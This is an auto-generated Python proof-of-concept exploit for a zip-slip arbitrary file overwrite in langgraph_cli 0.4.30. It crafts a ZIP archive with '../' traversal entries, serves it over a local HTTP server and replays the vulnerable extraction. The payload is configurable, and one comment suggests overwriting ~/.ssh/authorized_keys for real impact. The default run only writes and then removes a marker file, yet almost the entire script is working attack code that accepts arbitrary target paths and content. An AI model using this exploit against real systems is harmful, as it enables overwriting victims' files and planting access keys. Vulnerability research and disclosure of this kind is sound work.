#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli/langgraph_cli-0.4.30)
# Path: suspicious-018
# Sink: _download_repo_with_requests
# Auto-generated — run with: python3 afo_url_template_url_extracts__download_repo_with_requests.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Arbitrary File Overwrite (AFO) in langgraph_cli-0.4.30.

Vulnerability: The _download_repo_with_requests() function uses ZipFile.extractall()
without sanitizing entry names. A malicious ZIP archive with '../' path components
can write files outside the intended extraction directory.

Impact: Arbitrary file overwrite (AFO) - an attacker can overwrite any file the
victim has write access to by crafting a malicious ZIP archive.

Usage:
    python3 poc_exploit.py [--target /tmp/victim_project] [--payload /tmp/poc_success.txt]

    This script:
    1. Creates a malicious ZIP archive with path traversal entries
    2. Hosts it on a local HTTP server (or uses a provided URL)
    3. Simulates the vulnerable extraction process
"""

import os
import sys
import io
import zipfile
import tempfile
import shutil
import argparse
import urllib.request
import urllib.error
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import time

# =============================================================================
# Configuration - modify these as needed
# =============================================================================
HOST = "127.0.0.1"
PORT = 8888
MALICIOUS_ZIP_FILENAME = "malicious_template.zip"

# Benign payload by default - creates a marker file to demonstrate file write
# Change this to test with other paths (e.g., ~/.ssh/authorized_keys for real impact)
DEFAULT_PAYLOAD_PATH = "/tmp/poc_success.txt"
DEFAULT_PAYLOAD_CONTENT = "PWNED by langgraph_cli AFO exploit\n"


def create_malicious_zip(payload_path: str, payload_content: str) -> bytes:
    """
    Create a ZIP archive containing entries with path traversal.
    
    The ZIP will contain:
    - A normal directory (to simulate a valid template)
    - A file with '../' path traversal that writes outside the extraction directory
    
    Args:
        payload_path: Absolute path where the payload file should be written
        payload_content: Content to write to the payload file
    
    Returns:
        Bytes of the malicious ZIP archive
    """
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Add a normal directory to make it look like a valid template
        zf.writestr("template-main/", "")
        zf.writestr("template-main/README.md", "This is a template\n")
        
        # Add the malicious entry with path traversal
        # Calculate how many '../' we need to escape the extraction directory
        # The extraction happens to a user-specified path, so we target an absolute path
        # Using absolute path in the ZIP entry name for direct overwrite
        malicious_entry_name = f"../../../../../../..{payload_path}"
        zf.writestr(malicious_entry_name, payload_content)
        
        # Add another normal file to make it less suspicious
        zf.writestr("template-main/main.py", "# Main file\n")
    
    return zip_buffer.getvalue()


class MaliciousZipHandler(BaseHTTPRequestHandler):
    """HTTP handler that serves the malicious ZIP archive."""
    
    def do_GET(self):
        """Serve the malicious ZIP file."""
        if self.path == f"/{MALICIOUS_ZIP_FILENAME}":
            self.send_response(200)
            self.send_header("Content-Type", "application/zip")
            self.send_header("Content-Disposition", 
                           f'attachment; filename="{MALICIOUS_ZIP_FILENAME}"')
            self.send_header("Content-Length", str(len(self.server.zip_data)))
            self.end_headers()
            self.wfile.write(self.server.zip_data)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass


class MaliciousZipServer(HTTPServer):
    """HTTP server that holds the malicious ZIP data."""
    
    def __init__(self, server_address, zip_data):
        self.zip_data = zip_data
        super().__init__(server_address, MaliciousZipHandler)


def simulate_vulnerable_extraction(zip_url: str, extract_path: str):
    """
    Simulate the vulnerable _download_repo_with_requests() function.
    
    This replicates the exact vulnerable code path from langgraph_cli.
    
    Args:
        zip_url: URL to the malicious ZIP archive
        extract_path: Directory where the ZIP should be extracted
    """
    print(f"[*] Simulating vulnerable extraction...")
    print(f"[*] Downloading from: {zip_url}")
    print(f"[*] Extracting to: {extract_path}")
    
    try:
        with urllib.request.urlopen(zip_url, timeout=10) as response:
            if response.status == 200:
                zip_data = response.read()
                print(f"[+] Downloaded {len(zip_data)} bytes")
                
                # This is the vulnerable call - no sanitization of entry names
                with zipfile.ZipFile(io.BytesIO(zip_data)) as zip_file:
                    print("[*] Extracting ZIP archive (vulnerable extractall)...")
                    zip_file.extractall(extract_path)
                    
                    # Post-extraction processing (same as original code)
                    for item in os.listdir(extract_path):
                        if item.endswith("-main"):
                            extracted_dir = os.path.join(extract_path, item)
                            for filename in os.listdir(extracted_dir):
                                shutil.move(
                                    os.path.join(extracted_dir, filename), 
                                    extract_path
                                )
                            shutil.rmtree(extracted_dir)
                
                print(f"[+] Extraction completed")
            else:
                print(f"[-] HTTP {response.status}: Failed to download")
                sys.exit(1)
                
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        sys.exit(1)
    except urllib.error.URLError as e:
        print(f"[-] URL Error: {e.reason}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="PoC for Arbitrary File Overwrite in langgraph_cli-0.4.30"
    )
    parser.add_argument(
        "--target",
        default=tempfile.mkdtemp(prefix="langgraph_poc_"),
        help="Target directory for extraction (default: temp directory)"
    )
    parser.add_argument(
        "--payload",
        default=DEFAULT_PAYLOAD_PATH,
        help=f"Path to write payload file (default: {DEFAULT_PAYLOAD_PATH})"
    )
    parser.add_argument(
        "--content",
        default=DEFAULT_PAYLOAD_CONTENT,
        help="Content to write to payload file"
    )
    parser.add_argument(
        "--url",
        help="URL to malicious ZIP (if not using local server)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("langgraph_cli-0.4.30 AFO Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    # Create the malicious ZIP archive
    print(f"[*] Creating malicious ZIP archive...")
    print(f"[*] Payload will be written to: {args.payload}")
    print(f"[*] Payload content: {args.content!r}")
    
    zip_data = create_malicious_zip(args.payload, args.content)
    print(f"[+] Malicious ZIP created ({len(zip_data)} bytes)")
    
    # Ensure target directory exists
    os.makedirs(args.target, exist_ok=True)
    print(f"[*] Target extraction directory: {args.target}")
    
    if args.url:
        # Use provided URL
        zip_url = args.url
        print(f"[*] Using provided URL: {zip_url}")
    else:
        # Start local HTTP server to serve the malicious ZIP
        print(f"[*] Starting malicious HTTP server on {HOST}:{PORT}...")
        server = MaliciousZipServer((HOST, PORT), zip_data)
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        time.sleep(0.5)  # Give server time to start
        
        zip_url = f"http://{HOST}:{PORT}/{MALICIOUS_ZIP_FILENAME}"
        print(f"[+] Server started, serving ZIP at: {zip_url}")
    
    print()
    
    # Simulate the vulnerable extraction
    simulate_vulnerable_extraction(zip_url, args.target)
    
    print()
    
    # Check if the payload was written
    if os.path.exists(args.payload):
        print(f"[+] SUCCESS! Payload file created at: {args.payload}")
        with open(args.payload, 'r') as f:
            content = f.read()
        print(f"[+] File contents: {content!r}")
    else:
        print(f"[-] Payload file not found at: {args.payload}")
        print("[*] Check if the path traversal was successful")
    
    print()
    print("[*] Cleaning up...")
    
    # Clean up the target directory
    if os.path.exists(args.target):
        shutil.rmtree(args.target)
        print(f"[*] Removed target directory: {args.target}")
    
    # Clean up payload file if it was created
    if os.path.exists(args.payload):
        os.remove(args.payload)
        print(f"[*] Removed payload file: {args.payload}")
    
    # Stop the HTTP server if we started one
    if not args.url:
        server.shutdown()
        print("[*] Stopped HTTP server")
    
    print()
    print("[*] Exploit demonstration complete")


if __name__ == "__main__":
    main()
